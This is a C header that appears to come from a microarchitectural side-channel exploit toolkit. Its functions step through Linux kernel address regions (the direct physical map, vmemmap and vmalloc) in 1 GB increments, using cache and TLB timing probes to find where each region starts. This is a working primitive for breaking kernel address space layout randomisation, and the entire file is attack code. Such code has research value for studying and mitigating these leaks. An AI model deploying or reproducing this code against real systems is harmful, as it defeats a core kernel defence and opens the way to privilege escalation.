#pragma once

#include "utils.h"
#include "cacheutils.h"
#include "tlb_flush.h"
#include <stdint.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <string.h>

#define IDENTITY_START 0xffff888000000000
#define IDENTITY_END   0xffffc87fffffffff
#define VMEMMAP_START  0xffff888800000000
#define VMEMMAP_END    (0xfffff00000000000-(1ULL<<30))

size_t __vmemmap_leak(size_t tries, size_t *found)
{
    size_t addr;
    for (addr = VMEMMAP_END; addr > VMEMMAP_START; addr -= (1ULL << 30)) {
        for (size_t i = 0; i < tries; ++i) {
            *found = hit(addr, 4) && hit_accurate(addr, 30);
            if (*found)
                break;
        }
        if (*found)
            break;
    }
    return addr;
}
size_t vmemmap_leak(size_t tries)
{
    size_t found = 0;
    return __vmemmap_leak(tries, &found);
}
size_t vmemmap_leak_found(size_t tries, size_t *found)
{
    return __vmemmap_leak(tries, found);
}

size_t __dpm_leak(size_t tries, size_t *found)
{
    size_t addr;
    for (addr = IDENTITY_START; addr < IDENTITY_END; addr += (1ULL << 30)) {
        for (size_t i = 0; i < tries; ++i) {
            *found = hit(addr, 4) && hit_accurate(addr, 30);
            if (*found)
                break;
        }
        if (*found)
            break;
    }
    return addr;
}
size_t dpm_leak(size_t tries)
{
    size_t found = 0;
    return __dpm_leak(tries, &found);
}
size_t dpm_leak_found(size_t tries, size_t *found)
{
    return __dpm_leak(tries, found);
}

size_t __vmalloc_leak(size_t tries, size_t *found)
{
    size_t addr;
    size_t dpm_base = dpm_leak(tries);
    // 128 GB after the dpm base
    for (addr = dpm_base + (128ULL << 30); addr < VMEMMAP_END; addr += (1ULL << 30)) {
        for (size_t i = 0; i < tries; ++i) {
            *found = hit(addr, 4) && hit_accurate(addr, 30);
            if (*found)
                break;
        }
        if (*found)
            break;
    }
    return addr;
}
size_t vmalloc_leak(size_t tries)
{
    size_t found = 0;
    return __vmalloc_leak(tries, &found);
}
size_t vmalloc_leak_found(size_t tries, size_t *found)
{
    return __vmalloc_leak(tries, found);
}